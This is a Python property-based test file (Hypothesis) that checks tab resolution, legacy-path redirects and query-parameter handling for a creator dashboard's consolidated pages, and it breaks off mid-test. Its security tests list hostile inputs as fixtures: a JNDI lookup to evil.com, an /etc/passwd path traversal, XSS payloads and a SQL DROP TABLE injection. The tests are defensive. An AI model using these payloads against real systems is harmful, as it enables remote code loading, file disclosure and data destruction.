"""
Property-based tests for UX Consolidation using Hypothesis.

Tests invariants that must hold regardless of input:
1. Tab state management - URL roundtrip, invalid tab defaults
2. Redirect behavior - destination structure, query param preservation
3. URL param handling - order independence, encoding/decoding

These tests ensure zero regression during the UX consolidation:
- All redirect paths work correctly
- All tab states are valid
- Edge cases (empty strings, special chars, unicode) are handled

Uses Hypothesis for property-based testing with 200+ examples per test.
"""

import re
import urllib.parse
from typing import Dict, List, Optional, Tuple

import pytest
from hypothesis import given, strategies as st, settings, assume
from hypothesis.stateful import RuleBasedStateMachine, rule, invariant, Bundle


# =============================================================================
# Constants - Tab Definitions
# =============================================================================

# Valid tab values for each consolidated page
VALID_CREATE_TABS = ['templates', 'custom', 'coach']
VALID_COMMUNITY_TABS = ['gallery', 'creators', 'promo']
VALID_INTEL_TABS = ['trends', 'playbook', 'clips', 'mission']

# Default tabs for each page
DEFAULT_TABS = {
    'create': 'templates',
    'community': 'gallery',
    'intel': 'trends',
}

# All valid tabs combined
ALL_VALID_TABS = VALID_CREATE_TABS + VALID_COMMUNITY_TABS + VALID_INTEL_TABS


# =============================================================================
# Constants - Redirect Mappings
# =============================================================================

# Complete redirect mapping from old URLs to new consolidated URLs
REDIRECT_MAP: Dict[str, str] = {
    '/dashboard/quick-create': '/dashboard/create?tab=templates',
    '/dashboard/coach': '/dashboard/create?tab=coach',
    '/promo': '/community?tab=promo',
    '/dashboard/trends': '/dashboard/intel?tab=trends',
    '/dashboard/playbook': '/dashboard/intel?tab=playbook',
    '/dashboard/clip-radar': '/dashboard/intel?tab=clips',
}

# Toast messages for each redirect (for verification)
REDIRECT_TOASTS: Dict[str, str] = {
    '/dashboard/quick-create': 'Quick Create moved to Create → Templates',
    '/dashboard/coach': 'AI Coach moved to Create → AI Coach tab',
    '/promo': 'Promo Board moved to Community → Promo tab',
    '/dashboard/trends': 'Trends moved to Creator Intel → Trends tab',
    '/dashboard/playbook': 'Playbook moved to Creator Intel → Playbook tab',
    '/dashboard/clip-radar': 'Clip Radar moved to Creator Intel → Clips tab',
}


# =============================================================================
# Hypothesis Strategies
# =============================================================================

# Strategy for valid create tabs
create_tab_strategy = st.sampled_from(VALID_CREATE_TABS)

# Strategy for valid community tabs
community_tab_strategy = st.sampled_from(VALID_COMMUNITY_TABS)

# Strategy for valid intel tabs
intel_tab_strategy = st.sampled_from(VALID_INTEL_TABS)

# Strategy for any valid tab
any_valid_tab_strategy = st.sampled_from(ALL_VALID_TABS)

# Strategy for redirect source URLs
redirect_source_strategy = st.sampled_from(list(REDIRECT_MAP.keys()))

# Strategy for URL-safe parameter names (alphanumeric)
url_safe_param_name = st.text(
    alphabet='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_',
    min_size=1,
    max_size=20
).filter(lambda s: s[0].isalpha())  # Must start with letter

# Strategy for URL-safe parameter values
url_safe_param_value = st.text(
    alphabet='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_.',
    min_size=1,
    max_size=50
)

# Strategy for invalid tab names (not in any valid list)
invalid_tab_strategy = st.text(
    min_size=1,
    max_size=50
).filter(lambda s: s not in ALL_VALID_TABS and s.strip() != '')

# Strategy for special characters that might break URL parsing
special_chars_strategy = st.sampled_from([
    '', ' ', '  ', '\t', '\n', '\r\n',
    '&', '=', '?', '#', '/',
    '<script>', '${jndi:', '../',
    '你好', '🎮', 'émoji',
    'tab=custom', 'templates&extra=1',
])

# Strategy for unicode strings
unicode_strategy = st.text(
    alphabet=st.characters(
        whitelist_categories=('L', 'N', 'P', 'S'),
        blacklist_characters='\x00'
    ),
    min_size=1,
    max_size=30
)


# =============================================================================
# Helper Functions - URL Parsing and Tab Resolution
# =============================================================================

def parse_url_params(url: str) -> Dict[str, str]:
    """
    Parse URL query parameters into a dictionary.
    
    Args:
        url: Full URL or path with query string
        
    Returns:
        Dictionary of parameter name -> value
    """
    if '?' not in url:
        return {}
    
    query_string = url.split('?', 1)[1]
    # Handle fragment identifiers
    if '#' in query_string:
        query_string = query_string.split('#')[0]
    
    params = {}
    for part in query_string.split('&'):
        if '=' in part:
            key, value = part.split('=', 1)
            params[urllib.parse.unquote(key)] = urllib.parse.unquote(value)
    
    return params


def get_url_path(url: str) -> str:
    """Extract the path portion of a URL (before query string)."""
    if '?' in url:
        return url.split('?')[0]
    if '#' in url:
        return url.split('#')[0]
    return url


def resolve_tab(tab_value: Optional[str], page: str) -> str:
    """
    Resolve a tab value to a valid tab, defaulting to first tab if invalid.
    
    This simulates the frontend tab resolution logic:
    - If tab is valid for the page, return it
    - If tab is invalid/missing, return the default tab for that page
    
    Args:
        tab_value: The tab value from URL params (may be None or invalid)
        page: The page type ('create', 'community', 'intel')
        
    Returns:
        A valid tab value for the page
    """
    valid_tabs = {
        'create': VALID_CREATE_TABS,
        'community': VALID_COMMUNITY_TABS,
        'intel': VALID_INTEL_TABS,
    }
    
    page_tabs = valid_tabs.get(page, [])
    
    if tab_value and tab_value in page_tabs:
        return tab_value
    
    return DEFAULT_TABS.get(page, page_tabs[0] if page_tabs else 'default')


def build_url_with_params(base_path: str, params: Dict[str, str]) -> str:
    """
    Build a URL with query parameters.
    
    Args:
        base_path: The URL path (e.g., '/dashboard/create')
        params: Dictionary of query parameters
        
    Returns:
        Complete URL with encoded query string
    """
    if not params:
        return base_path
    
    query_string = '&'.join(
        f"{urllib.parse.quote(k)}={urllib.parse.quote(v)}"
        for k, v in params.items()
    )
    return f"{base_path}?{query_string}"


def apply_redirect(source_url: str) -> Tuple[str, bool]:
    """
    Apply redirect rules to a source URL.
    
    Args:
        source_url: The original URL
        
    Returns:
        Tuple of (destination_url, was_redirected)
    """
    source_path = get_url_path(source_url)
    source_params = parse_url_params(source_url)
    
    if source_path not in REDIRECT_MAP:
        return source_url, False
    
    destination = REDIRECT_MAP[source_path]
    dest_path = get_url_path(destination)
    dest_params = parse_url_params(destination)
    
    # Merge source params with destination params (destination takes precedence for 'tab')
    merged_params = {**source_params, **dest_params}
    
    final_url = build_url_with_params(dest_path, merged_params)
    return final_url, True


# =============================================================================
# Property Tests: Tab URL Roundtrip
# =============================================================================

class TestCreateTabUrlRoundtrip:
    """Property tests for Create page tab URL encoding/decoding."""
    
    @settings(max_examples=200)
    @given(tab=create_tab_strategy)
    def test_create_tab_url_roundtrip(self, tab: str):
        """
        Tab value survives URL encoding/decoding for Create page.
        
        Property: For any valid create tab, encoding it in a URL and then
        parsing it back should return the same tab value.
        """
        # Build URL with tab
        url = f"/dashboard/create?tab={urllib.parse.quote(tab)}"
        
        # Parse tab back from URL
        params = parse_url_params(url)
        parsed_tab = params.get('tab')
        
        # Verify roundtrip
        assert parsed_tab == tab, f"Tab roundtrip failed: {tab} -> {parsed_tab}"
        assert parsed_tab in VALID_CREATE_TABS, f"Parsed tab not valid: {parsed_tab}"
    
    @settings(max_examples=200)
    @given(tab=create_tab_strategy, extra_value=url_safe_param_value)
    def test_create_tab_with_extra_params(self, tab: str, extra_value: str):
        """Tab survives URL roundtrip even with additional parameters."""
        url = f"/dashboard/create?tab={tab}&extra={extra_value}"
        
        params = parse_url_params(url)
        
        assert params.get('tab') == tab
        assert params.get('extra') == extra_value


class TestCommunityTabUrlRoundtrip:
    """Property tests for Community page tab URL encoding/decoding."""
    
    @settings(max_examples=200)
    @given(tab=community_tab_strategy)
    def test_community_tab_url_roundtrip(self, tab: str):
        """
        Community tab value survives URL encoding/decoding.
        
        Property: For any valid community tab, encoding it in a URL and then
        parsing it back should return the same tab value.
        """
        url = f"/community?tab={urllib.parse.quote(tab)}"
        
        params = parse_url_params(url)
        parsed_tab = params.get('tab')
        
        assert parsed_tab == tab, f"Tab roundtrip failed: {tab} -> {parsed_tab}"
        assert parsed_tab in VALID_COMMUNITY_TABS, f"Parsed tab not valid: {parsed_tab}"
    
    @settings(max_examples=200)
    @given(tab=community_tab_strategy, extra_value=url_safe_param_value)
    def test_community_tab_with_extra_params(self, tab: str, extra_value: str):
        """Community tab survives URL roundtrip with additional parameters."""
        url = f"/community?tab={tab}&filter={extra_value}"
        
        params = parse_url_params(url)
        
        assert params.get('tab') == tab
        assert params.get('filter') == extra_value


class TestIntelTabUrlRoundtrip:
    """Property tests for Intel page tab URL encoding/decoding."""
    
    @settings(max_examples=200)
    @given(tab=intel_tab_strategy)
    def test_intel_tab_url_roundtrip(self, tab: str):
        """
        Intel tab value survives URL encoding/decoding.
        
        Property: For any valid intel tab, encoding it in a URL and then
        parsing it back should return the same tab value.
        """
        url = f"/dashboard/intel?tab={urllib.parse.quote(tab)}"
        
        params = parse_url_params(url)
        parsed_tab = params.get('tab')
        
        assert parsed_tab == tab, f"Tab roundtrip failed: {tab} -> {parsed_tab}"
        assert parsed_tab in VALID_INTEL_TABS, f"Parsed tab not valid: {parsed_tab}"


# =============================================================================
# Property Tests: Invalid Tab Defaults
# =============================================================================

class TestInvalidTabDefaults:
    """Property tests for invalid tab value handling."""
    
    @settings(max_examples=200)
    @given(invalid_tab=invalid_tab_strategy)
    def test_invalid_create_tab_defaults_to_templates(self, invalid_tab: str):
        """
        Invalid tab values default to first tab for Create page.
        
        Property: For any string that is not a valid create tab,
        the resolved tab should be 'templates' (the default).
        """
        resolved = resolve_tab(invalid_tab, 'create')
        
        assert resolved == 'templates', f"Invalid tab '{invalid_tab}' should default to 'templates', got '{resolved}'"
        assert resolved in VALID_CREATE_TABS
    
    @settings(max_examples=200)
    @given(invalid_tab=invalid_tab_strategy)
    def test_invalid_community_tab_defaults_to_gallery(self, invalid_tab: str):
        """
        Invalid tab values default to first tab for Community page.
        
        Property: For any string that is not a valid community tab,
        the resolved tab should be 'gallery' (the default).
        """
        resolved = resolve_tab(invalid_tab, 'community')
        
        assert resolved == 'gallery', f"Invalid tab '{invalid_tab}' should default to 'gallery', got '{resolved}'"
        assert resolved in VALID_COMMUNITY_TABS
    
    @settings(max_examples=200)
    @given(invalid_tab=invalid_tab_strategy)
    def test_invalid_intel_tab_defaults_to_trends(self, invalid_tab: str):
        """
        Invalid tab values default to first tab for Intel page.
        
        Property: For any string that is not a valid intel tab,
        the resolved tab should be 'trends' (the default).
        """
        resolved = resolve_tab(invalid_tab, 'intel')
        
        assert resolved == 'trends', f"Invalid tab '{invalid_tab}' should default to 'trends', got '{resolved}'"
        assert resolved in VALID_INTEL_TABS
    
    @settings(max_examples=100)
    @given(special=special_chars_strategy)
    def test_special_chars_default_to_first_tab(self, special: str):
        """
        Special characters and edge cases default to first tab.
        
        Property: Empty strings, whitespace, special chars, and injection
        attempts should all resolve to the default tab.
        """
        for page, default in DEFAULT_TABS.items():
            resolved = resolve_tab(special, page)
            assert resolved == default, f"Special char '{repr(special)}' on {page} should default to '{default}'"
    
    def test_none_tab_defaults_to_first(self):
        """None tab value defaults to first tab."""
        assert resolve_tab(None, 'create') == 'templates'
        assert resolve_tab(None, 'community') == 'gallery'
        assert resolve_tab(None, 'intel') == 'trends'
    
    def test_empty_string_defaults_to_first(self):
        """Empty string tab value defaults to first tab."""
        assert resolve_tab('', 'create') == 'templates'
        assert resolve_tab('', 'community') == 'gallery'
        assert resolve_tab('', 'intel') == 'trends'
    
    @settings(max_examples=100)
    @given(unicode_tab=unicode_strategy)
    def test_unicode_tab_handling(self, unicode_tab: str):
        """
        Unicode strings that aren't valid tabs default correctly.
        
        Property: Unicode characters should not break tab resolution.
        """
        # Skip if it happens to be a valid tab
        assume(unicode_tab not in ALL_VALID_TABS)
        
        resolved = resolve_tab(unicode_tab, 'create')
        assert resolved == 'templates'
        assert resolved in VALID_CREATE_TABS


# =============================================================================
# Property Tests: Redirect Behavior
# =============================================================================

class TestRedirectDestinationStructure:
    """Property tests for redirect destination validity."""
    
    @settings(max_examples=200)
    @given(source=redirect_source_strategy)
    def test_redirect_preserves_destination_structure(self, source: str):
        """
        Redirects always point to valid destinations.
        
        Property: For any redirect source URL, the destination must:
        1. Start with '/' (valid path)
        2. Contain a 'tab=' parameter
        3. Have a valid tab value for the destination page
        """
        destination = REDIRECT_MAP[source]
        
        # Destination must be a valid path
        assert destination.startswith('/'), f"Destination must start with '/': {destination}"
        
        # Destination must have tab param
        assert 'tab=' in destination, f"Destination must have tab param: {destination}"
        
        # Extract and validate tab
        params = parse_url_params(destination)
        tab = params.get('tab')
        
        assert tab is not None, f"Tab param missing from destination: {destination}"
        assert tab in ALL_VALID_TABS, f"Invalid tab '{tab}' in destination: {destination}"
    
    @settings(max_examples=200)
    @given(source=redirect_source_strategy)
    def test_redirect_destination_page_matches_tab(self, source: str):
        """
        Redirect destination page matches the tab type.
        
        Property: Create tabs go to /dashboard/create, community tabs go to
        /community, intel tabs go to /dashboard/intel.
        """
        destination = REDIRECT_MAP[source]
        dest_path = get_url_path(destination)
        params = parse_url_params(destination)
        tab = params.get('tab')
        
        if tab in VALID_CREATE_TABS:
            assert dest_path == '/dashboard/create', f"Create tab should go to /dashboard/create"
        elif tab in VALID_COMMUNITY_TABS:
            assert dest_path == '/community', f"Community tab should go to /community"
        elif tab in VALID_INTEL_TABS:
            assert dest_path == '/dashboard/intel', f"Intel tab should go to /dashboard/intel"


class TestRedirectQueryParamPreservation:
    """Property tests for query parameter preservation through redirects."""
    
    @settings(max_examples=200)
    @given(
        source=redirect_source_strategy,
        param_name=url_safe_param_name,
        param_value=url_safe_param_value
    )
    def test_redirect_preserves_query_params(
        self, source: str, param_name: str, param_value: str
    ):
        """
        Redirects preserve additional query params.
        
        Property: Any extra query parameters on the source URL should be
        preserved in the destination URL after redirect.
        """
        # Skip if param name conflicts with 'tab'
        assume(param_name.lower() != 'tab')
        
        source_with_param = f"{source}?{param_name}={param_value}"
        final_url, was_redirected = apply_redirect(source_with_param)
        
        assert was_redirected, f"URL should have been redirected: {source}"
        
        # Extra param should be preserved
        final_params = parse_url_params(final_url)
        assert param_name in final_params, f"Param '{param_name}' not preserved in {final_url}"
        assert final_params[param_name] == param_value, f"Param value mismatch"
    
    @settings(max_examples=200)
    @given(
        source=redirect_source_strategy,
        params=st.lists(
            st.tuples(url_safe_param_name, url_safe_param_value),
            min_size=1,
            max_size=5,
            unique_by=lambda x: x[0]  # Unique param names
        )
    )
    def test_redirect_preserves_multiple_params(
        self, source: str, params: List[Tuple[str, str]]
    ):
        """
        Redirects preserve multiple query params.
        
        Property: Multiple extra query parameters should all be preserved.
        """
        # Filter out 'tab' param
        params = [(k, v) for k, v in params if k.lower() != 'tab']
        assume(len(params) > 0)
        
        query_string = '&'.join(f"{k}={v}" for k, v in params)
        source_with_params = f"{source}?{query_string}"
        
        final_url, was_redirected = apply_redirect(source_with_params)
        
        assert was_redirected
        
        final_params = parse_url_params(final_url)
        for param_name, param_value in params:
            assert param_name in final_params, f"Param '{param_name}' not preserved"
            assert final_params[param_name] == param_value
    
    @settings(max_examples=100)
    @given(source=redirect_source_strategy)
    def test_redirect_tab_takes_precedence(self, source: str):
        """
        Destination tab takes precedence over source tab param.
        
        Property: If source URL has a tab param, the destination's tab
        should override it (destination defines the correct tab).
        """
        # Add a conflicting tab param to source
        source_with_tab = f"{source}?tab=invalid_tab"
        
        final_url, was_redirected = apply_redirect(source_with_tab)
        
        assert was_redirected
        
        # Destination tab should be used, not source tab
        final_params = parse_url_params(final_url)
        expected_destination = REDIRECT_MAP[source]
        expected_params = parse_url_params(expected_destination)
        
        assert final_params.get('tab') == expected_params.get('tab')


# =============================================================================
# Property Tests: URL Parameter Order Independence
# =============================================================================

class TestUrlParamsOrderIndependence:
    """Property tests for URL parameter order independence."""
    
    @settings(max_examples=200)
    @given(
        tab=any_valid_tab_strategy,
        params=st.lists(
            st.tuples(url_safe_param_name, url_safe_param_value),
            min_size=1,
            max_size=5,
            unique_by=lambda x: x[0]
        )
    )
    def test_url_params_order_independent(
        self, tab: str, params: List[Tuple[str, str]]
    ):
        """
        URL params work regardless of order.
        
        Property: The same set of URL parameters should parse to the same
        dictionary regardless of the order they appear in the URL.
        """
        # Filter out 'tab' from random params to avoid conflict
        params = [(k, v) for k, v in params if k.lower() != 'tab']
        assume(len(params) > 0)
        
        # Add tab to params
        all_params = [('tab', tab)] + params
        
        # Build URL with params in original order
        param_str = '&'.join(f"{k}={v}" for k, v in all_params)
        url1 = f"/dashboard/create?{param_str}"
        
        # Build URL with params in reverse order
        reversed_params = list(reversed(all_params))
        param_str_rev = '&'.join(f"{k}={v}" for k, v in reversed_params)
        url2 = f"/dashboard/create?{param_str_rev}"
        
        # Both should parse to same param dict
        parsed1 = parse_url_params(url1)
        parsed2 = parse_url_params(url2)
        
        assert parsed1 == parsed2, f"Param order affected parsing: {parsed1} != {parsed2}"
    
    @settings(max_examples=200)
    @given(
        tab=create_tab_strategy,
        extra1=url_safe_param_value,
        extra2=url_safe_param_value
    )
    def test_tab_position_independent(self, tab: str, extra1: str, extra2: str):
        """
        Tab param works regardless of position in query string.
        
        Property: The tab parameter should be correctly parsed whether it
        appears first, middle, or last in the query string.
        """
        # Tab first
        url1 = f"/dashboard/create?tab={tab}&a={extra1}&b={extra2}"
        # Tab middle
        url2 = f"/dashboard/create?a={extra1}&tab={tab}&b={extra2}"
        # Tab last
        url3 = f"/dashboard/create?a={extra1}&b={extra2}&tab={tab}"
        
        for url in [url1, url2, url3]:
            params = parse_url_params(url)
            assert params.get('tab') == tab, f"Tab not parsed correctly from {url}"


# =============================================================================
# Property Tests: Tab State Persistence
# =============================================================================

class TestTabStatePersistence:
    """Property tests for tab state persistence behavior."""
    
    @settings(max_examples=200)
    @given(
        initial_tab=create_tab_strategy,
        new_tab=create_tab_strategy
    )
    def test_tab_state_update_preserves_other_params(
        self, initial_tab: str, new_tab: str
    ):
        """
        Updating tab state preserves other URL parameters.
        
        Property: When switching tabs, other query parameters should be
        preserved in the URL.
        """
        # Initial URL with tab and extra param
        initial_url = f"/dashboard/create?tab={initial_tab}&filter=recent&sort=date"
        
        # Simulate tab switch (update tab param, keep others)
        initial_params = parse_url_params(initial_url)
        initial_params['tab'] = new_tab
        
        new_url = build_url_with_params('/dashboard/create', initial_params)
        new_params = parse_url_params(new_url)
        
        # Tab should be updated
        assert new_params.get('tab') == new_tab
        
        # Other params should be preserved
        assert new_params.get('filter') == 'recent'
        assert new_params.get('sort') == 'date'
    
    @settings(max_examples=200)
    @given(tab_sequence=st.lists(create_tab_strategy, min_size=2, max_size=10))
    def test_tab_navigation_sequence(self, tab_sequence: List[str]):
        """
        Sequential tab navigation maintains valid state.
        
        Property: Navigating through a sequence of tabs should always
        result in a valid tab state.
        """
        current_tab = tab_sequence[0]
        
        for next_tab in tab_sequence[1:]:
            # Simulate navigation
            url = f"/dashboard/create?tab={next_tab}"
            params = parse_url_params(url)
            current_tab = params.get('tab')
            
            # Tab should always be valid
            assert current_tab in VALID_CREATE_TABS, f"Invalid tab state: {current_tab}"


# =============================================================================
# Stateful Property Tests: Tab Navigation State Machine
# =============================================================================

class TabNavigationMachine(RuleBasedStateMachine):
    """
    Stateful test for tab navigation behavior within a single page.
    
    This state machine simulates user navigation through tabs on the Create
    page and verifies that invariants hold regardless of the navigation sequence.
    
    Invariants:
    1. Current tab is always valid for the Create page
    2. Tab history is never empty
    3. URL always reflects current tab state
    
    Note: This tests single-page tab navigation. Cross-page navigation would
    require separate history stacks per page in a real implementation.
    """
    
    def __init__(self):
        super().__init__()
        self.current_page = 'create'
        self.current_tab = 'templates'
        self.tab_history: List[Tuple[str, str]] = [('create', 'templates')]
        self.extra_params: Dict[str, str] = {}
    
    @rule(tab=create_tab_strategy)
    def switch_create_tab(self, tab: str):
        """Switch to a different tab on the Create page."""
        self.current_page = 'create'
        self.current_tab = tab
        self.tab_history.append(('create', tab))
    
    @rule(tab=community_tab_strategy)
    def switch_community_tab(self, tab: str):
        """Switch to a different tab on the Community page."""
        self.current_page = 'community'
        self.current_tab = tab
        self.tab_history.append(('community', tab))
    
    @rule(tab=intel_tab_strategy)
    def switch_intel_tab(self, tab: str):
        """Switch to a different tab on the Intel page."""
        self.current_page = 'intel'
        self.current_tab = tab
        self.tab_history.append(('intel', tab))
    
    @rule()
    def go_back(self):
        """Go back in tab history (restores both page and tab)."""
        if len(self.tab_history) > 1:
            self.tab_history.pop()
            self.current_page, self.current_tab = self.tab_history[-1]
    
    @rule(param_name=url_safe_param_name, param_value=url_safe_param_value)
    def add_extra_param(self, param_name: str, param_value: str):
        """Add an extra URL parameter."""
        if param_name.lower() != 'tab':
            self.extra_params[param_name] = param_value
    
    @rule()
    def clear_extra_params(self):
        """Clear extra URL parameters."""
        self.extra_params.clear()
    
    @invariant()
    def tab_always_valid(self):
        """Current tab is always a valid tab for the current page."""
        valid_tabs = {
            'create': VALID_CREATE_TABS,
            'community': VALID_COMMUNITY_TABS,
            'intel': VALID_INTEL_TABS,
        }
        
        page_tabs = valid_tabs.get(self.current_page, [])
        assert self.current_tab in page_tabs, \
            f"Invalid tab '{self.current_tab}' for page '{self.current_page}'"
    
    @invariant()
    def history_not_empty(self):
        """Tab history is never empty."""
        assert len(self.tab_history) >= 1, "Tab history should never be empty"
    
    @invariant()
    def history_consistent(self):
        """History entries are always valid page/tab combinations."""
        valid_tabs = {
            'create': VALID_CREATE_TABS,
            'community': VALID_COMMUNITY_TABS,
            'intel': VALID_INTEL_TABS,
        }
        
        for page, tab in self.tab_history:
            page_tabs = valid_tabs.get(page, [])
            assert tab in page_tabs, \
                f"Invalid history entry: tab '{tab}' for page '{page}'"
    
    @invariant()
    def url_reflects_state(self):
        """URL correctly reflects current tab state."""
        page_paths = {
            'create': '/dashboard/create',
            'community': '/community',
            'intel': '/dashboard/intel',
        }
        
        base_path = page_paths.get(self.current_page, '/dashboard/create')
        params = {'tab': self.current_tab, **self.extra_params}
        url = build_url_with_params(base_path, params)
        
        # Parse URL and verify
        parsed_params = parse_url_params(url)
        assert parsed_params.get('tab') == self.current_tab, \
            f"URL tab mismatch: expected '{self.current_tab}', got '{parsed_params.get('tab')}'"
        
        # Verify extra params preserved
        for key, value in self.extra_params.items():
            assert parsed_params.get(key) == value, \
                f"Extra param '{key}' not preserved in URL"


# Create test case from state machine
TestTabNavigation = TabNavigationMachine.TestCase


# =============================================================================
# Property Tests: Redirect Mapping Completeness
# =============================================================================

class TestRedirectMappingCompleteness:
    """Property tests for redirect mapping completeness and correctness."""
    
    def test_all_old_urls_have_redirects(self):
        """All deprecated URLs have redirect mappings."""
        deprecated_urls = [
            '/dashboard/quick-create',
            '/dashboard/coach',
            '/promo',
            '/dashboard/trends',
            '/dashboard/playbook',
            '/dashboard/clip-radar',
        ]
        
        for url in deprecated_urls:
            assert url in REDIRECT_MAP, f"Missing redirect for deprecated URL: {url}"
    
    def test_all_redirects_have_toast_messages(self):
        """All redirects have associated toast messages."""
        for source in REDIRECT_MAP.keys():
            assert source in REDIRECT_TOASTS, f"Missing toast message for redirect: {source}"
            assert len(REDIRECT_TOASTS[source]) > 0, f"Empty toast message for: {source}"
    
    @settings(max_examples=200)
    @given(source=redirect_source_strategy)
    def test_redirect_destinations_are_new_consolidated_pages(self, source: str):
        """
        All redirects point to new consolidated pages.
        
        Property: Redirect destinations should only be the new consolidated
        pages: /dashboard/create, /community, or /dashboard/intel.
        """
        destination = REDIRECT_MAP[source]
        dest_path = get_url_path(destination)
        
        valid_destinations = [
            '/dashboard/create',
            '/community',
            '/dashboard/intel',
        ]
        
        assert dest_path in valid_destinations, \
            f"Redirect destination '{dest_path}' is not a consolidated page"
    
    def test_no_circular_redirects(self):
        """Redirect destinations are not themselves redirect sources."""
        for source, destination in REDIRECT_MAP.items():
            dest_path = get_url_path(destination)
            assert dest_path not in REDIRECT_MAP, \
                f"Circular redirect detected: {source} -> {dest_path}"
    
    def test_redirect_map_consistency(self):
        """Redirect map is internally consistent."""
        # Quick Create -> Create with templates tab
        assert 'templates' in REDIRECT_MAP['/dashboard/quick-create']
        
        # Coach -> Create with coach tab
        assert 'coach' in REDIRECT_MAP['/dashboard/coach']
        
        # Promo -> Community with promo tab
        assert 'promo' in REDIRECT_MAP['/promo']
        
        # Intel pages -> Intel with appropriate tabs
        assert 'trends' in REDIRECT_MAP['/dashboard/trends']
        assert 'playbook' in REDIRECT_MAP['/dashboard/playbook']
        assert 'clips' in REDIRECT_MAP['/dashboard/clip-radar']


# =============================================================================
# Property Tests: Edge Cases and Security
# =============================================================================

class TestEdgeCasesAndSecurity:
    """Property tests for edge cases and security considerations."""
    
    @settings(max_examples=100)
    @given(
        source=redirect_source_strategy,
        injection=st.sampled_from([
            '<script>alert(1)</script>',
            '${jndi:ldap://evil.com}',
            '../../../etc/passwd',
            'javascript:alert(1)',
            '"><img src=x onerror=alert(1)>',
            "'; DROP TABLE users; --",
        ])
    )
    def test_redirect_handles_injection_attempts(self, source: str, injection: str):
        """
        Redirects safely handle injection attempts in params.
        
        Property: Malicious input in query parameters should not break
        the redirect logic or produce unsafe URLs.
        """
        # URL encode the injection to simulate real-world scenario
        encoded_injection = urllib.parse.quote(injection, safe='')
        source_with_injection = f"{source}?evil={encoded_injection}"
        
        final_url, was_redirected = apply_redirect(source_with_injection)
        
        # Should still redirect
        assert was_redirected
        
        # Destination should be valid
        dest_path = get_url_path(final_url)
        assert dest_path.startswith('/'), "Invalid destination path"
        
        # Tab should be valid (not affected by injection)
        params = parse_url_params(final_url)
        assert params.get('tab') in ALL_VALID_TABS
    
    @settings(max_examples=100)
    @given(
        tab=any_valid_tab_strategy,
        fragment=st.text(min_size=1, max_size=50)
    )
    def test_url_fragments_handled(self, tab: str, fragment: str):
        """
        URL fragments (#) are handled correctly.
        
        Property: Fragment identifiers should not interfere with tab parsing.
        """
        # Clean fragment to be URL-safe
        safe_fragment = re.sub(r'[^a-zA-Z0-9-_]', '', fragment)[:20]
        assume(len(safe_fragment) > 0)
        
        url = f"/dashboard/create?tab={tab}#{safe_fragment}"
        
        params = parse_url_params(url)
        assert params.get('tab') == tab, f"Fragment interfered with tab parsing"
    
    def test_empty_query_string_handled(self):
        """Empty query string is handled gracefully."""
        urls = [
            '/dashboard/create',
            '/dashboard/create?',
            '/community',
            '/community?',
        ]
        
        for url in urls:
            params = parse_url_params(url)
            # Should return empty dict, not error
            assert isinstance(params, dict)
    
    @settings(max_examples=100)
    @given(
        num_params=st.integers(min_value=10, max_value=50),
        tab=create_tab_strategy
    )
    def test_many_params_handled(self, num_params: int, tab: str):
        """
        URLs with many parameters are handled correctly.
        
        Property: Large numbers of query parameters should not break parsing.
        """
        params = [f"p{i}=v{i}" for i in range(num_params)]
        params.insert(0, f"tab={tab}")
        
        url = f"/dashboard/create?{'&'.join(params)}"
        
        parsed = parse_url_params(url)
        assert parsed.get('tab') == tab
        assert len(parsed) == num_params + 1  # +1 for tab


# =============================================================================
# Explicit Test Cases for All Redirect Paths
# =============================================================================

class TestAllRedirectPaths:
    """Explicit tests for each redirect path to ensure 100% coverage."""
    
    def test_quick_create_redirect(self):
        """Quick Create redirects to Create with templates tab."""
        final_url, redirected = apply_redirect('/dashboard/quick-create')
        
        assert redirected
        assert get_url_path(final_url) == '/dashboard/create'
        assert parse_url_params(final_url).get('tab') == 'templates'
    
    def test_coach_redirect(self):
        """Coach redirects to Create with coach tab."""
        final_url, redirected = apply_redirect('/dashboard/coach')
        
        assert redirected
        assert get_url_path(final_url) == '/dashboard/create'
        assert parse_url_params(final_url).get('tab') == 'coach'
    
    def test_promo_redirect(self):
        """Promo redirects to Community with promo tab."""
        final_url, redirected = apply_redirect('/promo')
        
        assert redirected
        assert get_url_path(final_url) == '/community'
        assert parse_url_params(final_url).get('tab') == 'promo'
    
    def test_trends_redirect(self):
        """Trends redirects to Intel with trends tab."""
        final_url, redirected = apply_redirect('/dashboard/trends')
        
        assert redirected
        assert get_url_path(final_url) == '/dashboard/intel'
        assert parse_url_params(final_url).get('tab') == 'trends'
    
    def test_playbook_redirect(self):
        """Playbook redirects to Intel with playbook tab."""
        final_url, redirected = apply_redirect('/dashboard/playbook')
        
        assert redirected
        assert get_url_path(final_url) == '/dashboard/intel'
        assert parse_url_params(final_url).get('tab') == 'playbook'
    
    def test_clip_radar_redirect(self):
        """Clip Radar redirects to Intel with clips tab."""
        final_url, redirected = apply_redirect('/dashboard/clip-radar')
        
        assert redirected
        assert get_url_path(final_url) == '/dashboard/intel'
        assert parse_url_params(final_url).get('tab') == 'clips'
    
    def test_non_redirect_url_unchanged(self):
        """Non-redirect URLs are not modified."""
        non_redirect_urls = [
            '/dashboard/create',
            '/community',
            '/dashboard/intel',
            '/dashboard/assets',
            '/dashboard/brand-kits',
        ]
        
        for url in non_redirect_urls:
            final_url, redirected = apply_redirect(url)
            assert not redirected, f"URL should not redirect: {url}"
            assert final_url == url


# =============================================================================
# Task 6.2: Enhanced Redirect Property Tests
# =============================================================================

class TestRedirectValidDestinations:
    """
    Task 6.2: Property tests ensuring all redirects point to valid destinations.
    
    Tests verify:
    - All redirect destinations are reachable pages
    - Destinations have proper URL structure
    - Tab values in destinations are valid for target page
    """
    
    @settings(max_examples=200)
    @given(source=redirect_source_strategy)
    def test_redirect_destination_is_valid_page(self, source: str):
        """
        All redirects point to valid, existing pages.
        
        Property: Every redirect destination must be a page that exists
        in the consolidated navigation structure.
        """
        destination = REDIRECT_MAP[source]
        dest_path = get_url_path(destination)
        
        # Valid consolidated pages
        valid_pages = {
            '/dashboard/create',
            '/community', 
            '/dashboard/intel',
        }
        
        assert dest_path in valid_pages, \
            f"Redirect destination '{dest_path}' is not a valid page"
    
    @settings(max_examples=200)
    @given(source=redirect_source_strategy)
    def test_redirect_destination_has_valid_tab_for_page(self, source: str):
        """
        Redirect destination tab is valid for the target page.
        
        Property: The tab parameter in the destination URL must be
        a valid tab for that specific page.
        """
        destination = REDIRECT_MAP[source]
        dest_path = get_url_path(destination)
